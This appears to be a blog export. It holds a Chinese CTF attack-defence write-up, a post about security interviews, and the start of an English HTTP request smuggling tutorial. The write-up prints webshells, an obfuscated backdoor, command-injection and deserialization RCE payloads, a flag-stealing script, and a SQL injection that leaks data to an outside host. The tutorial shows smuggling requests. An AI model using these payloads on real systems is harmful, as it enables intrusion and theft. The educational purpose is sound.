pluginspage='http://www.macromedia.com/go/getflashplayer' type='application/x-shockwave-flash' width='$row[ad_width]' height='$row[ad_height]'&gt;&lt;/embed&gt; &lt;/object&gt;\"; break; case 2: // CODE $ads[] = $row['ad_code']; break; case 3: // TEXT $ads[] = \"&lt;a href='\" . url('default/affiche/index', array('ad_id' =&gt; $row['ad_id'], 'uri' =&gt; urlencode($row[\"ad_link\"]))) . \"' target='_blank'&gt;\" . htmlspecialchars($row['ad_code']) . '&lt;/a&gt;'; break; case 4: // url $ads[] = file_get_contents($_POST['url']); } } $position_style = 'str:' . $position_style; $need_cache = ECTouch::view()-&gt;caching; ECTouch::view()-&gt;caching = false; ECTouch::view()-&gt;assign('ads', $ads); $val = ECTouch::view()-&gt;fetch($position_style); ECTouch::view()-&gt;caching = $need_cache; return html_entity_decode($val);} 这里比较扎眼的便是case 4这里 12case 4: // url $ads[] = file_get_contents($_POST['url']); 这里很明显只有一段代码，而且还是file_get_contents()，这里便是一个任意文件读取的漏洞。 这里放上一叶飘零大佬的jio本以供学习： 12345678910111213141516171819202122232425import requestsimport reimport timedata = { \"url\":\"http://10.0.1.2?token=RCNWBJXQ\"}url = \"http://10.50.%s.2/mobile/index.php\"while True: for x in range(0,37): urll = url%x try:truetruetrue#attack moudle r = requests.post(url=urll,data=data,timeout=3) flag = re.findall('&lt;li&gt;.*?&lt;/li&gt;',r.content)[0][4:-5] #submit flag moudle flagurl = \"https://192.168.37.180/match/WAR20/oapi?atn=answers&amp;token=RCNWBJXQ&amp;flag=%s\"%flag r = requests.get(url=flagurl,verify=False) #check flag if \"wrong answer.\" not in r.content: print flag print r.content except: pass print \"attack ip times: \"+str(x) time.sleep(60) 这里问什么文件读取就可以拿到flag呢？因为file_get_contents这个函数，既然要读取url中的文件，自然得先去请求url，所以自然可以拿到flag Poc 3官方还给了一个mobile/api/uc.php的hint，当时我们看了一下，感觉没啥用…这里还是主要参考一叶飘零大佬的分析… 当时乍一看好像没什么问题…现在仔细看这里 12345678910111213141516171819202122if (in_array($get['action'], array( 'test', 'deleteuser', 'renameuser', 'gettag', 'synlogin', 'synlogout', 'updatepw', 'updatebadwords', 'updatehosts', 'updateapps', 'updateclient', 'updatecredit', 'getcreditsettings', 'updatecreditsettings', 'writesth'))) { $uc_note = new uc_note(); exit($uc_note-&gt;$get['action']($get, $post));} else { exit(API_RETURN_FAILED);} 这个array就有个地方就显得特别的奇葩，那就是最后的writesth… 要是框架的作者…这么写怕不是会被打死…这里肯定就是主办方自己加上的。我们全局搜一下writesth看看都有些啥 果然找到一个函数 123456789function writesth($get, $post){ $cachefile = $this-&gt;appdir .$get['name']; $fp = fopen($cachefile, 'w'); $s = \"&lt;?php\\r\\n\"; $s .= $get['content']; fwrite($fp, $s); fclose($fp); return API_RETURN_SUCCEED;} 换句话说，就是上传的文件名是你get请求的name，内容就是你的content参数，这里就可以制造一个webshell来打。 我们也可以测试一下： 1234567891011121314&lt;?phpfunction writesth($name, $content){ $cachefile = \"./\".$name; $fp = fopen($cachefile, 'w'); $s = \"&lt;?php\\r\\n\"; $s .= $content; fwrite($fp, $s); fclose($fp); return 0;}$name = \"shell.php\";$content = \"@eval(\\$_POST[zedd]);\\n?&gt;\";writesth($name,$content);?&gt; 本地成功拿到shell，shell.php内容为 123&lt;?php@eval($_POST[zedd]);?&gt; 但是这里得注意写入的地方是否有权限，无权限的话得考虑向上层目录走一走。 Something Else其他的一些，可以参照一叶飘零大佬的博客，也可以参照ECSHOP v2.7.3注入漏洞分析和修复这个博客。总体来说还是一场比较有收获的AWD，也学习到了挺多知识。也是几乎过了一个月左右才来总结这次AWD…（哎哟这种拖延症真的是…写这篇基本靠回忆了… 第二届“红帽杯”线下攻防大赛主要还是参考一叶飘零大佬的wp以及自己的一些亲身经历总结经验…（发现跟大佬的差距真的是大..2333 这里提一下，为了找到主办方的洞的话，可以下载主办方出的框架的对应的版本，然后进行diff，这样很快就可以找到主办方故意留下的洞。如果是整个项目比较的话啊，我还是比较推荐BeyondCompare的. Web1Poc 1在wp-admin/tools.php下有一个主办方留下的洞： 1$poc=\"a#s#s#e#r#t\"; $poc_1=explode(\"#\",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; @$poc_2($_POST['_']); explode的[解释用法][http://www.w3school.com.cn/php/func_string_explode.asp] array explode ( string $delimiter , string $string [, int $limit ] ) explode() 函数把字符串打散为数组。 也可以直接echo看一下$poc_2就是assert，也就是@assert($_POST['_'])这个马。 Poc 2在wp-login.php下注意到如下代码，有system很可能是一个任意命令执行： 1234case 'debug': $file = addslashes($_POST['file']); system(\"find /tmp -iname \".escapeshellcmd($file)); break; 首先我们先解释addslashes()这个函数的[基本用法][http://php.net/manual/zh/function.addslashes.php] string addslashes ( string $str ) addslashes — 使用反斜线引用字符串 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（‘）、双引号（“）、反斜线（\\）与 NUL（NULL 字符）。 还有escapeshellcmd()的[基本用法][http://php.net/manual/zh/function.escapeshellcmd.php] string escapeshellcmd ( string $command ) escapeshellcmd — shell 元字符转义 escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;`|\\?~&lt;&gt;^()[]{}$*, \\x0A 和 \\xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 基本就是把引号什么的及其其他的给转义了的意思。 system中要执行的就是在/tmp目录下查找$_POST的参数的文件。而且根据find的手册，我们可以知道它还有一个exec的参数。 -exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。 {} 花括号代表前面find查找出来的文件名。 iname在这里指的是不区分大小写；name则为区分大小写 例如 1find&nbsp;/etc&nbsp;-name&nbsp;\"passwd*\"&nbsp;-exec&nbsp;grep&nbsp;\"root\"&nbsp;{}&nbsp;\\; 这里是查找/etc下名为以passwd开头的文件中是否含有root 这里我们只需要随便穿一个文件名，再加上-exec cat /flag ;因为最后;是被escapeshellcmd给转义了，所以不需要加反斜杠。如果加上-or的话就相当于可以直接执行-exec后的命令。所以这里我们可以使用payload 1find /tmp -iname a -or -exec cat /flag/flag ; 可以拿php本地测试一下 12345&lt;?php $a = \"a -or -exec cat /flag/flag ;\"; $file = addslashes($a); system(\"find /tmp -iname \".escapeshellcmd($file));?&gt; Poc 3在index.php下直接有一个暴露的小马 1@eval($_POST['admin']); Poc 4在class-wp-cachefile.php中，详细分析见：[参考链接][https://github.com/bl4de/security_whitepapers/blob/master/RIPS_PHP_Security_Calendar_2017.md] Eles抄了一个作业 1&lt;script language=\"PHP\"&gt;if(md5($_GET[guo])===\"fe831851246d186db20c229fa19a0172\"){@eval($_POST[power]);}&lt;/script&gt; 基本就是也跟着拿这个马一样打别人…也算是后知后觉吧…后来只能打为数不多几个了吧… 主要是web1给的用户对web目录没有写的权限，当时没什么经验…不知道自己传个马打自己…这就很难受了…导致了web1被打穿了…以及还有不死马… Web2这里不得不吐槽一下web2的checker机制，只放两个静态都能过checker，稳得不行… Poc 1看到/config/site下有两个莫名其妙的命名的php文件： 121.php2.php 一看就应该是某些马的存放位置咯 在1.php中可以看到 1'SITE_DOMAINS' =&gt; '123sadccv=&gt;1)&amp;&amp;($_GET[a]($_GET[b]));exit();$a=array(a', //网站的其他域名 很明显的位置$_GET[a]($_GET[b]) Poc 22.php中： 1234567&lt;?php$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(50).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?&gt; var_dump可以看到 123$_uU -&gt; string(3) \"chr\"$_cC -&gt; string(16) \"eval($_POST[2]);\"$_fF -&gt; string(15) \"create_function\" 所以是： 1$_ = create_function(\"\",eval($_POST[2])); 可以直接用POST 2=phpinfo();使用 Poc 3在与官方的fincms对比下我们可以发现新增文件为finecms/dayrui/config/config.class.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?php$config = unserialize(base64_decode($config));if(isset($_GET['param'])){ $config-&gt;$_GET['param'];}class FinecmsConfig{ private $config; private $path; public $filter; public function __construct($config=\"\"){ $this-&gt;config = $config; echo 123; } public function getConfig(){ if($this-&gt;config == \"\"){ $config = isset($_POST['Finecmsconfig'])?$_POST['Finecmsconfig']:\"\"; } } public function SetFilter($value){ if($this-&gt;filter){ foreach($this-&gt;filter as $filter){ $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value); } $this-&gt;filter = array(); }else{ return false; } return true; } public function __get($key){ $this-&gt;SetFilter($key); die(\"\"); }} 开头看起来有个马的样子。 直接定位该文件的引用位置:finecms/Init.php，看到关键函数这里，我们可以看到 1234if(isset($_COOKIE['FINECMS_CONFIG'])){ $config = $_COOKIE['FINECMS_CONFIG']; require FCPATH.'dayrui/config/config.class.php';} 在index.php可以找到FCPATH的define 1define('FCPATH', dirname(__FILE__).'/finecms/'); 所以上面那段代码就是把这个config.class.php给引入进来。而$config由Init.php中的cookie中的FINECMS_CONFIG取得。 整个代码逻辑就是先获取cookie中的FINECOMS_CONFIG的参数，然后调用config.class.php，先对$config进行base64解码，再进行反序列化，检查是否有GET请求传参，有的话就访问$config-&gt;$param。 而在SetFilter($value)函数中我们可以看到有call_user_func($filter,$value);，这里我们可以利用任意命令执行漏洞。 1call_user_func('system','ls'); 如此可以直接执行system(ls)。所以我们需要让call_user_func($filter,$value);中的参数 1$filter = 'system';//$value即为函数传参 所以我们先构造一个$FinecmsConfig对象实例，将其序列化。 1234567class FinecmsConfig{ private $config; private $path; public $filter=array('system');}$fine = new FinecmsConfig();echo base64_encode(serialize($fine)); 将得到的base64加密后的字符串传入$config，传入参数$param实现任意命令执行。测试代码如下： 123456$config = 'TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO3M6NDoicGF0aCI7czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fQ==';$param = 'ls';$config = unserialize(base64_decode($config));if(isset($param)){ $config-&gt;$param;} 在这里，反序列化之后调用的__wakeup()这个魔术函数，而上段代码中并没有，所以并不会产生什么影响。 若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。 好，我们全部梳理一遍，真正利用的点就是在SetFilter利用call_user_func这个函数，而调用SetFilter的函数就是__get()这个魔术方法，这个魔术方法的触发条件是： 当调用当前环境下未定义或不可见的类属性或方法时，重载方法会被调用。 也就是说如果我们访问一个实例不存在的成员，或者私有成员变量的话，就会触发 所以，$config-&gt;$param;在这里触发，而$param可控，而且它也作为是call_user_func的传入回调函数的参数，就造成了任意代码利用 所以整个代码的漏洞利用，应该是先构造一个$filter=array('system')的FinecmsConfig实例，因为原代码中是需要先base64解码之后再反序列化，我们就先将其序列化之后再用base64加密，得到 1TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO3M6NDoicGF0aCI7czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fQ== 即可用GET参数param任意命令执行。 Poc 4详细见： https://zhuanlan.zhihu.com/p/35133267 http://lu4n.com/finecms-rce-0day/ payload: 1http://localhost/index.php?c=Api&amp;m=html&amp;name=search&amp;format=html&amp;params={\"search_sql\":\"action=cache name=block.L]=phpinfo()&amp;$cache[L\"} Poc 5cms自带漏洞：编号CVE-2018-6893 详细见： https://bbs.ichunqiu.com/thread-36673-1-1.html /index.php?s=member&amp;c=api&amp;m=checktitle&amp;id=13&amp;title=123&amp;module=news,(selectload_file(concat(0x5c5c5c5c,database(),0x2e6e65766a32372e636579652e696f5c5c616461)))as total 总结主要是自己在这方面积累的并不多吧，西湖那次说实话确实有点水分，挺作秀的。比赛水平并不是很高，自己跟队友也是混到了第6左右，也是个人的第二次攻防赛；第三次攻防赛稍微对上次有点经验，不过还是自己见识太少了，太菜了…排名比较靠中，也是因为都是通过线上赛筛选过来的队伍，所以实力都很强。不得不说的是，红帽杯的web2的checker只检查index.php和admin.php，我们删了很多其他东西，就稳定得分了。。一方面是记录流量的准备不是很充分，waf也并没有准备，基本就是准备了一些心理准备吧hhhh。对于不死马的处理以及对于自己对自己的维护环境没有权限的情况没有经验，这里可以简述一下前面两者的处理方法，不死马的处理可以通过覆写一句话马的文件或者重启web服务，对于自己web目录没有权限的情况可以自己拿自己的shell达到获取权限的目的。 之后可能会写一写攻防赛的经验总结吧…还是得等这段期末过吧..","link":"/2018/06/27/%E8%AE%B0%E5%87%A0%E6%AC%A1%E6%94%BB%E9%98%B2%E8%B5%9B/"},{"title":"面试经验分享","text":"这篇写一下最近的笔试面试经验 最近投了360、腾讯、阿里、华为，全都是安全技术岗。 360笔试投的是 Web 安全工程师，我只收到了能力笔试的邀请…听说还有技术笔试，然而我并没有收到邀请… 能力笔试有30个题，时限30min，15个数理逻辑，15个什么偏情商的题目。 一定要准备好笔纸，数理逻辑题会有方程啥的计算题，数理逻辑字面意思，都是数理逻辑的题目，比如说数学题，几个人说一句话其中一个人说假话判断是谁的这种题目，建议前20min做数理逻辑，虽然剩下15个比较简单，不需要什么计算，但是会有一些比较耗时间的概念题让你去读题干。 很遗憾这里没有准备充分，口算方程导致没过笔试… 腾讯投的是安全技术，CSIG 事业群 第一次一面收到的一面竟然是后台策略安全…然后去看了很多注入相关的知识，结果一面基本没问什么技术题…（感觉是 HR 面的 首先上来问你的实习经验（因为我有写，比较自豪地答了自己的实习经历 问运维经验 问客户端开发 问最基本的区别问题（TCP/UDP区别 问实习时间 问自己的意向（自己也如实答了，说自己原本想去云鼎实验室什么的…然后说了一些有的没的，然后对方也说他们部门是后台开发的… 问反爬虫（也是聊得比较多的一块了 整个面试流程估计没有10min，顶多15min左右…虽然对方说会给同事看，让我等面试通知…表面感觉一面过了…但是后来想起来面试时间真的是短…就有点后怕… 基本就这些了吧，二面再更吧。（如果有二面的话…希望有吧… 第二次一面第一次一面很开心地凉了，重新被放回简历池，好几天都没人捞我。 直到自己投的腾讯安全平台部在 3/20 晚上突然打电话给我，自己手机显示是”QQ返利”的电话，还差点就想挂了…还好没挂，否则就真错过了… 一上来直接开始第二次一面，内容不太记得清楚了，稍有印象的是问了 phar 反序列化的原理以及 DNS rebinding 攻防方法，还有 Docker layer 的构成（自己简历有写），其他就记得不是非常清楚了，貌似都不是很难。 第二次二面接着第二次一面，间隔不超过 5min ，刚坐下不久就收到了二面的电话… 一上来就问了 Javascript 闭包问题，直接说忘了。然后问了 bypass disable_function 的问题，但是他问的是绕过 php 沙箱那里一类偏底层分析的…诸如给你一个 webshell ，但是如果这个环境调用了污点分析禁止执行一些危险命令，怎么绕过这个机制…当时就给跪了…直接说超出了自己的知识范围…(而且貌似这种安全机制，目前自己接触到的渗透目标还没碰到过类似的这么高等级的安全防护机制…) 接着问了比较基础的攻击方法，SSRF 攻防方式，因为面我的是个偏二进制的带团队的 Leader 型的人物，感觉已经很久没碰 Web 安全方面的了，面的关于 Web 的不是很深。问了编译原理语法分析的作用等。还问了自己为啥选择搞 Web 安全… 基本还是比较好答的，不是特别刁难。面的也比较舒服。 第二次三面第二次二面隔了5天左右，很幸运地在一天中午接到了来自腾讯深圳总部 HR 的面试电话，问了自己意向工作地，以后发展，想不想工作啥的，基本没什么刁难的问题，最后口头通知给了 offer 😄 总结总地来说，运气比较好，腾讯面试异常的顺利，面得也比较轻松，幸运地拿到了腾讯安平的 offer ，虽然没有去七大实验室，但是还是很开心的～ 阿里能力测评10个阅读理解，10个找规律，10个简单的数学题 其余都是自我评价类，比如你觉得你的优点比缺点多，给5个选项 完全不符合 比较不符合 一般符合 比较符合 完全符合 选了估计有100来道题，其中有重复的题目，估计考的是你记忆或者是否前后一致的情况。 吐槽这里就不得不吐槽阿里了…我腾讯都拿到了 offer ，阿里的状态在我答完测评后的两个周还是”面试中”的状态，然而却没有任何面试通知…估计这状态会持续更久… 等了很久，结果连简历筛都没过hhh… 华为投的是攻防/测试，研发中心岗位 机试攻防岗的机试不作为否决条件，只作参考，机试一共三题。 第一题第一题简单的将小端字符串转换为大端字符串。 比如012345678，第一位字符代表是大端还是小端，0 代表小端，需要逆序输出接下来的八位，比如这里输出 87654321；1 代表大端，直接原样输出就行，比如 112345678 ，输出 12345678 即可。 没什么难度。 第二题在一个二维平面坐标系，给定五个坐标，求从原点依次经过这五个点，最后回到原点的最短距离。 第三题切水果题… 总结算法太菜，没什么好总结的。 能力测评跟阿里的一样，也是很多道关于自身评测的选择题，比较耗时间 面试面试分为两块面试，一块是业务面，一块是综合面。 业务面跟综合面都比较水，可能面的部门有学长的关系，都没怎么问技术问题，随便问了一下就没了。","link":"/2019/03/14/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"},{"title":"Help you understand HTTP Smuggling in one article","text":"This year’s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven’t had much time. I recently took a look at it. Sorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here 一篇文章带你读懂 HTTP Smuggling 攻击. When I researched the other day, it happened that mengchen@Knownsec 404 Team also published an article, which also brought me more inspiration. The author’s article is very good. I strongly recommend reading it. Here I combine the author’s article with some of my own understanding. This article can also be understood as a supplement and a more detailed description of that article. The entire article was delayed for about two months because of my time. The middle time interval may be longer, so the article will have more omissions, please forgive me. It is not easy to write. Recently, I have been paying attention to this aspect of security issues. Welcome to study and discuss together: ) Contact: emVkZHl1Lmx1QGdtYWlsLmNvbQ== In the future, if there is a new summary, I will also send my blog. TL;NR Pic from https://twitter.com/SpiderSec/status/1200413390339887104?s=19 TimeLineBefore we mention HTTP Smuggling, let’s take a look at the evolution process: @Amit Klein proposed the HTTP Response Splitting technology in 2004, which is the prototype of the HTTP Smuggling attack. About HTTP Smuggling This attack method was first proposed by @Watchfire in 2005 HTTP Request Smuggling. HTTP Parameter Pollution (HPP), also known as HTTP parameter pollution, is actually a special HTTP Smuggling attack. It was first proposed by @Stefano di Paola &amp; @Luca Carettoni at the OWASP Poland conference in 2009. It caused a big sensation and was widely used in bypassing WAF. Defcon 24 in 2016, @regilero proposed [Hiding Wookiees In Http]([https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-% 20Regilero-Hiding-Wookiees-In-Http.pdf] (https://media.defcon.org/DEF CON 24 / DEF CON 24 presentations / DEF CON 24-Regilero-Hiding-Wookiees-In-Http.pdf)), Further reveals the HTTP Smuggling attack. Defcon 27 in 2019, @James Kettle proposed [HTTP Desync Attacks: Smashing into the Cell Next Door]([https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON- 27-albinowax-HTTP-Desync-Attacks.pdf] (https://media.defcon.org/DEF CON 27 / DEF CON 27 presentations / DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf)), explained How to use PayPal vulnerability with HTTP Smuggling technology. CausesHowever, @James Kettle’s PPT did not describe in detail what the attack was and how it was formed. At first, I still had very big doubts after reading it. Then I learned about the HTTP Smuggling’s in the @regilero blog. Article, I have a clear understanding. HTTP Connection ModIn the protocol design before HTTP1.0, every time a client makes an HTTP request, it needs to establish a TCP connection with the server. Modern web site pages are composed of multiple resources. We need to obtain the content of a web page, not only request HTML documents, but also various resources such as JS, CSS, and images. , It will cause the load overhead of the HTTP server to increase. So in HTTP1.1,Keep-Alive and Pipeline were added. Keep-AliveAccording to RFC7230: ​ HTTP/1.1 defaults to the use of “persistent connections”, allowing multiple requests and responses to be carried over a single connection. The “close” connection option is used to signal that a connection will not persist after the current request/response. HTTP implementations SHOULD support persistent connections. Keep-Alive is used by default in HTTP/1.1, allowing multiple requests and responses to be hosted on a single connection. ​ The so-called Keep-Alive, is to add a special request header Connection: Keep-Alive in the HTTP request, tell the server, after receiving this HTTP request, do not close the TCP link, followed by the same target server HTTP Request, reuse this TCP link, so only need to perform a TCP handshake process, which can reduce server overhead, save resources, and speed up access. Of course, this feature is enabled by default in HTTP1.1. Of course, some requests carry Connection: close, after the communication is completed, the server will interrupt the TCP connection. Pipline With Keep-Alive, there will be a Pipeline, and the client can send its own HTTP request like a pipeline without waiting for the response from the server. After receiving the request, the server needs to follow the first-in first-out mechanism, strictly correlate the request and response, and then send the response to the client. Nowadays, the browser does not enable Pipeline by default, but the general server provides support for Pipleline. The more important introduction in HTTP / 1.1 is the pipeline technology. The following is a comparison chart with and without piepeline technology: We can clearly see that after using the pipeline, there is no need to wait for the previous request to complete its response before processing the second request. This is like asynchronous processing. Message Bodyhttps://tools.ietf.org/html/rfc7230#section-3.3 Transfer-Encoding Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6). However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP's case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource. Transfer-Encoding is a field designed to support the secure transmission of binary data by 7-bit transfer services. It is somewhat similar to Content-Transfer-Encoding in the MIME (Multipurpose Internet Mail Extensions) header. In the case of HTTP, Transfer-Encoding is mainly used to encode the payload body in a specified encoding form for secure transmission to the user. Introduced in HTTP/1.1 and deprecated in HTTP/2. MDN lists several attributes: 1chunked | compress | deflate | gzip | identity Here we mainly focus on chunked, a transmission encoding method, which is not mentioned for the first time in a network attack. It also used in bypassing WAF frequently. We can see the definition specification of chunk transmission in RFC7230. 4.1. Chunked Transfer Coding The chunked transfer coding wraps the payload body in order to transfer it as a series of chunks, each with its own size indicator, followed by an OPTIONAL trailer containing header fields. Chunked enables content streams of unknown size to be transferred as a sequence of length-delimited buffers, which enables the sender to retain connection persistence and the recipient to know when it has received the entire message. chunked-body = *chunk last-chunk trailer-part CRLF chunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF chunk-size = 1*HEXDIG last-chunk = 1*(\"0\") [ chunk-ext ] CRLF chunk-data = 1*OCTET ; a sequence of chunk-size octets The chunk-size field is a string of hex digits indicating the size of the chunk-data in octets. The chunked transfer coding is complete when a chunk with a chunk-size of zero is received, possibly followed by a trailer, and finally terminated by an empty line. A recipient MUST be able to parse and decode the chunked transfer coding. 4.1.1. Chunk Extensions The chunked encoding allows each chunk to include zero or more chunk extensions, immediately following the chunk-size, for the sake of supplying per-chunk metadata (such as a signature or hash), mid-message control information, or randomization of message body size. chunk-ext = *( \";\" chunk-ext-name [ \"=\" chunk-ext-val ] ) chunk-ext-name = token chunk-ext-val = token / quoted-string The chunked encoding is specific to each connection and is likely to be removed or recoded by each recipient (including intermediaries) before any higher-level application would have a chance to inspect the extensions. Hence, use of chunk extensions is generally limited to specialized HTTP services such as “long polling” (where client and server can have shared expectations regarding the use of chunk extensions) or for padding within an end-to-end secured connection. A recipient MUST ignore unrecognized chunk extensions. A server ought to limit the total length of chunk extensions received in a request to an amount reasonable for the services provided, in the same way that it applies length limitations and timeouts for other parts of a message, and generate an appropriate 4xx (Client Error) response if that amount is exceeded. If you don’t want to look too carefully here, we just need to understand what kind of structure it is. You can also refer to Wiki: Chunked transfer encoding, for example if we want to send the following message using chunked. 1Wikipedia in\\r\\n\\r\\nchunks. We can send it like this: 12345678910111213POSTT /xxx HTTP/1.1Host: xxxContent-Type: text/plain Transfer-Encoding: chunked4\\r\\nWiki\\r\\n5\\r\\npedia\\r\\ne\\r\\n in\\r\\n\\r\\nchunks.\\r\\n0\\r\\n\\r\\n Here is a brief explanation. *We use \\r\\n for CRLF, so\\r\\n is two bytes *; the first number 4 indicates that there will be 4 bytes data next, which is the 4 letters of Wiki, and according to the RFC document standard, the letter Wiki part needs to be followed by \\r\\n to indicate the chunk-data part, and the number 4 needs to be followed by\\r\\n to indicate the chunk -size part, and the number is a hexadecimal number, such as the third data. 12e\\r\\nin\\r\\n\\r\\nchunks.\\r\\n Here the first space exists, the \\r\\n in the data counts two characters, and the last\\r\\n indicates the end of the data. In this case, the first space is 1 byte + in 2 bytes letter + 2 \\r\\n counts 4 bytes + ‘chunks.’ 7 bytes letter = 14 bytes, 14 is ‘e’ in hexadecimal. The last 0\\r\\n\\r\\n indicates the end of the chunk section. BackgroundIn itself, these things are not harmful, they are used to increase the network transmission rate in various ways, but in some special cases, some corresponding security problems will occur. ​ In order to improve the user’s browsing speed, improve the user experience, and reduce the burden on the server, many websites use the CDN acceleration service. The simplest acceleration service is to add a reverse proxy server with caching function in front of the source station. When the user requests some static resources, it can be obtained directly from the proxy server without having to obtain it from the source server. This has a very typical topology. Here is a picture from @mengchen : Generally speaking, the reverse proxy and back-end server will not use pipeline technology, or even keep-alive. The measures taken by the reverse proxy is to reuse the TCP connection, because compare with the reverse proxy and back-end server, the reverse proxy server and the back-end server IP are relatively fixed, and requests from different users establish a link with the back-end server through the proxy server, and the TCP link between the two is reused. ​ When we send a fuzzy HTTP request to the proxy server, because the implementation of the two servers is different, the proxy server may consider this to be a HTTP request and then forward it to the source server of the back-end. However, after the source server is parsed, only part of it is a normal request, and the remaining part is a smuggling request. When the part affects the normal user’s request, the HTTP smuggling attack is implemented. The HTTP Smuggling attack is based on the inconsistency between the reverse proxy and the backend server in parsing and processing HTTP requests. Using this difference, we can embed another HTTP request in order to achieve our purpose of “smuggling” the request. It directly shows that we can access intranet services or cause some other attacks. Attack MethodSince it is based on analytical differences, what analytical differences will we have? The scenario is the scenario above, but we simplify it and fix the back-end server to one, there is no certain probability. In other words, the architecture is similar to the following diagram: 123456User Front Backend| | ||------A-------&gt;| | | |-------A------&gt;| | |&lt;-A(200)-------||&lt;-A(200)-------| | We know that both Content-Length and Transfer-Encoding can be used as a way to process the body during POST data transmission. In order to facilitate reading and writing, we have the following shorthand rules for field processing priority rules: CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. And Front represents a typical front-end server such as a reverse proxy, and Backend represents a back-end business server that processes requests. In the following, \\r\\n is used instead of CRLF, and the length is two bytes. Chunks Priority On Content-LengthSome may see that this will have the same confusion as me. Is the RFC document not standardized for CL &amp; TE parsing priorities? Yes, we can read RFC 7230 Message Body Length: ​ If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream. Although it is pointed out that TL takes precedence over CL, we can still bypass it in some ways, or that the middleware is not implemented in accordance with this RFC standard specification, which leads to differences. For example, we use the following code to send an HTTP request: 12345678910111213141516printf 'GET / HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Content-length:56\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Dummy:Header\\r\\n\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\'GET /tmp HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\'GET /tests HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\| nc -q3 127.0.0.1 8080 The above correct resolution should be resolved into three requests: 1234567GET / HTTP/1.1Host:localhostContent-length:56Transfer-Encoding: chunkedDummy:Header0 123GET /tmp HTTP/1.1Host:localhostDummy:Header 123GET /tests HTTP/1.1Host:localhostDummy:Header If there is a TE &amp; CL priority problem, it will be parsed into two requests: 1234567891011GET / HTTP/1.1[CRLF]Host:localhost[CRLF]Content-length:56[CRLF]Transfer-Encoding: chunked[CRLF] (ignored and removed, hopefully)Dummy:Header[CRLF][CRLF]0[CRLF] (start of 56 bytes of body)[CRLF]GET /tmp HTTP/1.1[CRLF]Host:localhost[CRLF]Dummy:Header[CRLF] (end of 56 bytes of body, not parsed) 123GET /tests HTTP/1.1Host:localhostDummy:Header Bad Chunked TransmissionAccording to RFC7230 section 3.3.3 ： If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection. When receiving Transfer-Encoding: chunked, zorg, it should return a 400 error. We have a lot payloads to bypass it. Such as: 12345678910111213141516Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunkedGET / HTTP/1.1 Transfer-Encoding: chunkedX: X[\\n]Transfer-Encoding: chunkedTransfer-Encoding : chunked Null In HeadersThis problem is more likely to occur in some middleware servers written in C language, because \\0 stands for the end of string character in C language. When used in the header, if we use\\0, some middleware may appear abnormal Parsing. Such as: 12345678910111213141516171819# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)printf 'GET / HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Content-\\0dummy: 